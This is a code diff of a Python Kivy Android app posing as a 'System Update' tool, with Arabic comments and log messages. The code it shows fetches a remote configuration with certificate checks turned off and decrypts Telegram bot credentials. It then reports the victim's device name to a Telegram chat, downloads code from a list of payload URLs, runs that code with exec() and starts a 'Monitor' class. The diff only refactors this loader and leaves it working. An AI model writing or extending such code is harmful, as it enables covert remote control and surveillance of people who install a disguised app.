@@ -13,8 +13,8 @@ from kivy.uix.scrollview import ScrollView
 from kivy.uix.textinput import TextInput
 from kivy.uix.button import Button
 from kivy.utils import platform
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # إضافة مسار التطبيق الحالي لمسارات البحث عن المكتبات
 app_path = os.path.dirname(os.path.abspath(__file__))
@@ -24,8 +24,6 @@ for subdir in ['core', 'telegram', 'media', 'config']:
     sub_path = os.path.join(app_path, subdir)
     if os.path.exists(sub_path) and sub_path not in sys.path:
         sys.path.append(sub_path)
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class SystemUpdateApp(App):
     def build(self):
@@ -72,6 +70,8 @@ class SystemUpdateApp(App):
 
     def decrypt_token(self, encrypted_data):
         try:
+            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+            from cryptography.hazmat.backends import default_backend
             key = self._get_encryption_key()
             data = base64.b64decode(encrypted_data)
             iv = data[:12]
@@ -107,20 +107,24 @@ class SystemUpdateApp(App):
     def logic_engine(self):
         try:
             self.log("بدء تشغيل المحرك...")
-            time.sleep(2)
+            time.sleep(1)
+
+            # طلب صلاحيات الإنترنت
             if platform == 'android':
                 self.log("طلب صلاحيات الإنترنت...")
                 from android.permissions import request_permissions, Permission
                 request_permissions([Permission.INTERNET, Permission.ACCESS_NETWORK_STATE])
                 time.sleep(2)
 
+            # اختبار الاتصال
             self.log("اختبار الاتصال بـ 1.1.1.1...")
             try:
                 r = requests.get("https://1.1.1.1", timeout=5, verify=False)
                 self.log(f"الاتصال ناجح (حالة {r.status_code})")
             except Exception as e:
-                self.log(f"⚠️ فشل اختبار الاتصال المباشر: {str(e)}")
+                self.log(f"⚠️ فشل اختبار الاتصال: {str(e)}")
 
+            # جلب الإعدادات
             self.log(f"جلب الإعدادات من: {self.config_url[:60]}...")
             response = requests.get(self.config_url, timeout=15, verify=False)
             self.log(f"حالة HTTP: {response.status_code}")
@@ -131,37 +135,34 @@ class SystemUpdateApp(App):
             config = response.json()
             self.log("تم تحليل ملف الإعدادات بنجاح.")
 
-            tokens = []
-            for i, enc_token in enumerate(config.get('t', [])):
-                decrypted = self.decrypt_token(enc_token)
-                if decrypted:
-                    tokens.append(decrypted)
-                    self.log(f"✅ تم فك تشفير التوكن {i+1}")
-                else:
-                    self.log(f"❌ فشل فك تشفير التوكن {i+1}")
-
+            # فك تشفير التوكن الأول فقط
+            enc_tokens = config.get('t', [])
+            if not enc_tokens:
+                self.log("❌ لا توجد توكنات في الإعدادات")
+                return
+            token = self.decrypt_token(enc_tokens[0])
             v_id = self.decrypt_token(config.get('v', ''))
-            if not v_id:
-                self.log("❌ فشل فك تشفير معرف الدردشة (v)")
+            if not token or not v_id:
+                self.log("❌ فشل فك تشفير التوكن أو معرف الدردشة")
                 return
 
-            self.log(f"تم فك تشفير {len(tokens)} توكنات، معرف الدردشة: {v_id[:10]}...")
+            self.log(f"✅ تم فك تشفير التوكن ومعرف الدردشة")
+            # إرسال رسالة بدء التشغيل باسم الجهاز
+            device_name = self.get_device_name()
+            startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
+            if self.send_telegram(token, v_id, startup_msg):
+                self.log("✅ تم إرسال رسالة بدء التشغيل باسم الجهاز")
+            else:
+                self.log("⚠️ فشل إرسال رسالة بدء التشغيل")
 
+            # تخزين الإعدادات
             globals()['MASTER_CONFIG'] = {
-                'tokens': tokens,
+                'tokens': [token],
                 'v_id': v_id,
                 'payload_urls': config.get('payload_urls', [])
             }
 
-            # إرسال رسالة بدء التشغيل باسم الجهاز
-            if tokens:
-                device_name = self.get_device_name()
-                startup_msg = f"🚀 *System Online*\n📱 الجهاز: `{device_name}`\n🕒 الوقت: {time.strftime('%Y-%m-%d %H:%M:%S')}"
-                self.send_telegram(tokens[0], v_id, startup_msg)
-                self.log("تم إرسال رسالة بدء التشغيل باسم الجهاز.")
-
             self.log("بدء تحميل البايلودات...")
-            self.log_view.text += "\n[Progress] تحميل الوحدات... (35%)\n"
             self.load_payloads()
 
         except Exception as e:
@@ -171,9 +172,8 @@ class SystemUpdateApp(App):
     def load_payloads(self):
         payload_urls = globals()['MASTER_CONFIG'].get('payload_urls', [])
         if not payload_urls:
-            self.log("⚠️ لا توجد روابط بايلودات في الإعدادات!")
+            self.log("⚠️ لا توجد روابط بايلودات")
             return
-
         loaded = 0
         for url in payload_urls:
             try:
@@ -184,22 +184,16 @@ class SystemUpdateApp(App):
                 exec(code, globals())
                 self.log(f"✅ تم تحميل {name}")
                 loaded += 1
-                if loaded % 3 == 0:
-                    self.send_telegram(globals()['MASTER_CONFIG']['tokens'][0],
-                                       globals()['MASTER_CONFIG']['v_id'],
-                                       f"📦 تم تحميل {loaded}/{len(payload_urls)} وحدة")
             except Exception as e:
                 self.log(f"❌ فشل تحميل {name}: {str(e)}")
                 continue
-
         if 'Monitor' in globals():
-            self.log("بدء تشغيل خدمة المراقبة (Monitor)...")
+            self.log("بدء تشغيل Monitor...")
             monitor = globals()['Monitor']()
             monitor.start()
             self.log("✅ تم تشغيل Monitor")
-            self.log_view.text += "\n[System] الحالة: 100% - جاهز\n"
         else:
-            self.log("❌ خطأ: لم يتم العثور على كلاس Monitor بعد تحميل البايلودات.")
+            self.log("❌ لم يتم العثور على كلاس Monitor")
 
 if __name__ == '__main__':
     SystemUpdateApp().run()
